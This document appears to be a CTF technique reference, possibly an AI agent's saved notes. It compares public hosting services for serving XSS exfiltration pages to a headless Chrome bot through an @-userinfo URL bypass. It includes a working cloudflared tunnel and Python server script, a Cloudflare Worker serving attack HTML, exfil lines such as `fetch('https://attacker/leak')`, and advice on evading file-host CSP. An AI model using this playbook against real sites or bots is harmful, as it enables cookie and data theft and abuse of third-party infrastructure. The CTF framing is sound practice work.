# Public HTML Hosting for Bot XSS Exfil — Service Comparison (June 2026)

When you need to host a custom HTML/JS attack page that a headless Chrome bot
can reach via `@-userinfo` URL bypass (`http://127.0.0.1:TARGET_PORT@your-url/`), the
service you pick must satisfy THREE constraints simultaneously:

1. **Accessible on HTTP port 80** (or has HSTS preload) — the bot URL starts
   with `http://`, Chrome will try HTTP first. If the service only serves
   HTTPS on 443, the connection fails unless HSTS forces upgrade.
2. **No restrictive CSP on the served response** — many file hosts add
   `default-src 'self'` which blocks the exfil `fetch()`/`new Image().src`
   from your attack JS.
3. **Custom content** — the response must be YOUR HTML, not a fixed
   "Thanks for your upload" page.

## Service matrix (tested June 2026)

| Service | HTTP:80 | Custom HTML | CSP issue | Verdict |
|---|---|---|---|---|
| **ngrok free** (ngrok-free.dev) | ❌ HTTPS only on 443; HTTP request returns `307 Temporary Redirect` to HTTPS | ✅ yours | ❌ None (your server) | **Works for curl with `-L`** — curl follows the 307 redirect to HTTPS, reaches your local server, and confirms the request lands. **Bot's chrome (149) behavior is unverified** — in one June 2026 test the bot's headless chrome did NOT follow the redirect and the local server got 0 hits, even though curl on the same URL did. The Chrome version's strict-transport-security handling for `@-userinfo` URLs may differ from curl. **Test on the actual bot Chrome version before relying on ngrok free for @-userinfo bot attacks.** |
| **catbox.moe** (files.catbox.moe) | ✅ HTTPS via HSTS preload | ✅ yours | ❌ `default-src 'self'; img-src 'self' https://files.catbox.moe; ...` | **Blocks exfil** — `new Image().src = 'https://webhook.site/...'` is blocked by img-src |
| **webhook.site** | ✅ HTTP + HTTPS | ❌ fixed response | n/a | **Logging only** — can't run attack JS, only records the request. Free tier also rate-limits anonymous token creation via `/token` endpoint and may require API key for setting custom response bodies (use it as canary, not as exploit host) |
| **0x0.st** | ✅ HTTPS | ✅ yours | n/a | **Disabled for upload** as of June 2026 ("AI botnet spam") |
| **file.io** | ❌ 301 redirects to HTTPS | ✅ yours | n/a | Likely fails for HTTP bot URL |
| **httpbin.org/redirect-to?url=** | ✅ HTTP | ❌ fixed redirect | n/a | Can redirect to ngrok HTTPS but httpbin.org was 503 during testing |
| **serveo.net** (SSH tunnel) | ✅ HTTP | ✅ yours (via SSH) | ❌ None | SSH hangs on first connect (interactive TTY required for host key confirmation) — need `-T -o StrictHostKeyChecking=no` but still flaky. HTTP requests return 502 in the test session. |
| **bore.pub** / **expose.dev** | n/a | n/a | n/a | TCP tunnels, not HTTP — Chrome can't navigate raw TCP |
| **cloudflared quick tunnel** (`--url http://localhost:PORT`) | ❌ HTTP returns `501 Not Implemented` (not a 30x redirect); HTTPS via trycloudflare.com (HSTS preload) | ✅ yours (your local server) | ❌ None (your server) | **Verified working June 2026** — bot reaches tunnel via `@-userinfo` bypass. URL changes on every restart. See pattern below. |
| **Cloudflare Workers** (workers.dev) | ✅ HTTPS via HSTS preload | ✅ yours (your code) | ❌ None (your code) | **Best option if you have an account** — persistent URL, no CSP, full control |
| **Glitch / Replit / Vercel** | ❌ HTTPS only | ✅ yours | varies | Fails for HTTP bot URL unless they redirect HTTP→HTTPS and Chrome follows |

## cloudflared quick tunnel pattern (verified working, free, no auth)

For ephemeral CTF sessions where you need a public HTTP-reachable attack page in 30 seconds:

```bash
# 1. Serve your attack HTML locally on any port
mkdir -p /tmp/exfil_srv
cat > /tmp/exfil_srv/index.html << 'EOF'
<!doctype html><html><body><script>
// your attack JS
</script></body></html>
EOF

# Use a python server that returns index.html for ANY path
cat > /tmp/exfil_srv/server.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
INDEX = open('/tmp/exfil_srv/index.html', 'rb').read()
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[HIT] {self.command} {self.path} from {self.client_address[0]}", flush=True)
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.send_header('Content-Length', str(len(INDEX)))
        self.end_headers()
        self.wfile.write(INDEX)
    def log_message(self, *a): pass
HTTPServer(('0.0.0.0', 9877), H).serve_forever()
EOF

# 2. Run server in background
python3 /tmp/exfil_srv/server.py &
# run this under a process supervisor/background shell appropriate to your environment

# 3. Start cloudflared quick tunnel — NO auth needed
cloudflared tunnel --url http://localhost:9877 --no-autoupdate &
# URL is printed to stdout, e.g.:
# https://<random>.trycloudflare.com

# 4. Bot URL via @-userinfo bypass
# http://127.0.0.1:TARGET_PORT@<random>.trycloudflare.com/anything
# Bot navigates to the trycloudflare.com URL → Cloudflare proxies to your local 9877
# → your exploit HTML executes → JS exfils to your local 9877 server (logged)

# 5. Cleanup
pkill -f server.py; pkill -f cloudflared
```

**Why this works for HTTP bot URLs:** Cloudflare is on the HSTS preload list. When Chrome navigates to `http://127.0.0.1:TARGET_PORT@trycloudflare.com/x`, the userinfo is ignored for the actual connection target (browser parses userinfo separately), then Chrome sees the host `trycloudflare.com` and the trycloudflare HTTPS endpoint serves via HSTS-preloaded HTTPS. The `@-userinfo` URL parses as a same-origin navigation to `trycloudflare.com/x` over HTTPS.

Validation requires a real callback from the scoped bot to the local server through the tunnel; a success message from the report endpoint alone is not sufficient evidence.

**Pitfall — server/tunnel lifetime:** background processes may exit between test stages. Before each bot submission, verify both the local HTTP server and tunnel are still listening. Treat a missing callback as ambiguous until local reachability and tunnel health are confirmed.

**Pitfall — canary service vs exploit host:** a request-logging service may accept anonymous callbacks but still require authentication for custom response bodies. Verify whether the service can actually serve attacker-controlled HTML/JS before treating it as an exploit host.

**Pitfall — HTTP→HTTPS redirect assumptions:** curl following a redirect does not prove the headless browser will reproduce the same userinfo/HSTS/navigation behavior. Test the exact browser version and require a server-side callback before relying on the redirect chain.

## Workaround patterns (legacy)

### Option A: HTTP→HTTPS redirect on a public service
1. Upload your `attack.html` to catbox.moe (or any HTTPS-only file host with no CSP)
2. Get a public URL on a service that serves HTTP on port 80 and supports redirects
3. Set the redirect target to your catbox.moe HTTPS URL
4. Bot URL = `http://127.0.0.1:TARGET_PORT@<http-service>/<redirect-path>`

This requires a service with a customizable HTTP 30x redirect. Treat third-party service availability as volatile and re-test it at solve time.

### Option B: Self-hosted HTTP with public tunnel
See cloudflared pattern above (Option C in the matrix). Prefer cloudflared over serveo.net for stability.

### Option C: Cloudflare Worker (cleanest if you have an account)
```javascript
// worker.js
export default {
  async fetch(request) {
    return new Response(ATTACK_HTML, {
      headers: { 'Content-Type': 'text/html' }  // NO CSP, your choice
    });
  }
};
const ATTACK_HTML = `<!doctype html>...your attack...</body>`;
```

Deploy with `wrangler deploy`. URL is `https://<worker-name>.<your-subdomain>.workers.dev`.
Cloudflare is on the HSTS preload list, so Chrome will force HTTPS even
when the bot URL is `http://`. No CSP added by Cloudflare — full control.

## Test the bot reaches you BEFORE building the exploit

Use `webhook.site` as a free canary (anonymous, no auth):

1. Open `https://webhook.site/` in browser → it gives you a UUID in the URL bar
2. Bot URL: `http://127.0.0.1:TARGET_PORT@webhook.site/<UUID>`
3. Submit to `/bot`
4. Refresh webhook.site in browser — if the bot hit, you see the bot's IP, HeadlessChrome version, and Sec-Fetch-Mode=navigate.

For programmatic canary checking, you can use the `webhook.site/token` endpoint to get a token that lets you set a custom response body — but the API key (saved in memory as `WEBHOOK_TOKEN`) is required. Without it, the anonymous UUID endpoint has rate limits.

The proof you need is the callback itself: record the bot's request, browser/user-agent evidence when available, and the exact submitted URL. Do not carry one challenge's host, instance, or session result into the permanent technique reference.

## Why the public-file-host + restrictive-CSP combination breaks exfil

Many public file hosts (catbox.moe, transfer.sh) add a `Content-Security-Policy` header to prevent their CDN from being abused for XSS. The typical policy is:

```
default-src 'self'; img-src 'self' https://<host>; media-src 'self' https://<host>; ...
```

This means your `attack.html` can execute inline scripts (because they
include `script-src 'unsafe-inline'` in script-src), but any exfil
mechanism that loads an external resource — `new Image().src =
'https://attacker/leak'`, `fetch('https://attacker/leak')`, `<img>`,
`<link>`, etc. — is blocked by `default-src 'self'` or the more specific
`img-src`/`connect-src` whitelist.

To bypass: host your attack page on a service that does NOT add a CSP
header. Cloudflare Workers, your own VPS, cloudflared quick tunnel (local
server returns no CSP), or a self-hosted tunnel.
